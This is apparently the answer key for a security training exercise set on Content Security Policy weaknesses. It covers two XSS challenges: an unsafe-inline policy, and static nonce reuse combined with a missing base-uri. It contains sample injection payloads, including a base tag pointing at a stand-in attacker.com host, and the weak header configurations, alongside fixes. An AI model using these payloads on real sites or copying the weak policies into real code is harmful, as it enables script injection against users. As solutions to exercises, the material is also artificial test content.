# Solutions — Category 07: CSP & Filter Behavior

## Challenge 1: XSS-CSP-01 (Weak Route-Specific CSP Header)

### 1. Root Cause Analysis
The search route sets a weak Content Security Policy containing `'unsafe-inline'` and `'unsafe-eval'`. While the header is present, it fails to prevent inline script execution or event handler execution.

### 2. Header Comparison
- **Vulnerable Header**:
  ```http
  Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline';
  ```
- **Fixed Header**:
  ```http
  Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; object-src 'none'; base-uri 'self';
  ```

### 3. Remediation Diff
```diff
--- a/src/middleware/csp.js
+++ b/src/middleware/csp.js
@@ -12,3 +12,3 @@
-  const scriptSrc = opts.weak ? "'self' 'unsafe-inline' 'unsafe-eval'" : "'self'";
+  const scriptSrc = "'self'";
```
Removing `'unsafe-inline'` ensures that any injected `<script>` or event handler is blocked at the browser level.

---

## Challenge 2: XSS-CSP-02 (Nonce Reuse & Base-URI Hijacking)

### 1. Root Cause Analysis
1. **Static Nonce**: Reusing a static nonce (e.g. `nonce-reusedStaticNonce123`) across requests allows an attacker to include that static nonce in their payload: `<script nonce="reusedStaticNonce123">`.
2. **Missing `base-uri`**: Without `base-uri 'self'`, an attacker who can inject HTML can insert `<base href="https://attacker.com/">`. Any subsequent relative script imports like `<script src="/app.js">` will be fetched from `https://attacker.com/app.js`.

### 2. Remediation Diff
```diff
--- a/src/routes/categories.js
+++ b/src/routes/categories.js
@@ -102,4 +102,5 @@
-  const nonce = "staticNonce123";
-  res.setHeader("Content-Security-Policy", `default-src 'self'; script-src 'nonce-${nonce}';`);
+  const nonce = crypto.randomBytes(16).toString("base64");
+  res.setHeader("Content-Security-Policy", `default-src 'self'; script-src 'nonce-${nonce}'; base-uri 'self'; object-src 'none';`);
```
Always generate a cryptographically strong, non-predictable nonce for each HTTP request and define `base-uri 'self'`.
